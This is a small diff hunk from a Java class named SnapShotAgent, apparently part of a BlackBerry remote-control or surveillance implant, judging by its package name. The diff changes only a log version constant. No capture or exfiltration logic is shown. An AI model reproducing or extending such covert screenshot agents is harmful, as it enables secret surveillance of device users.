@@ -19,7 +19,7 @@ import com.ht.rcs.blackberry.utils.WChar;
 public class SnapShotAgent extends Agent {
     private static final int SNAPSHOT_DEFAULT_JPEG_QUALITY = 75;
 
-    private static final int LOG_SNAPSHOT_VERSION = 2009032301;
+    private static final int LOG_SNAPSHOT_VERSION = 2009031201;
 
     static Debug debug = new Debug("SnapShotAgent", DebugLevel.VERBOSE);
 
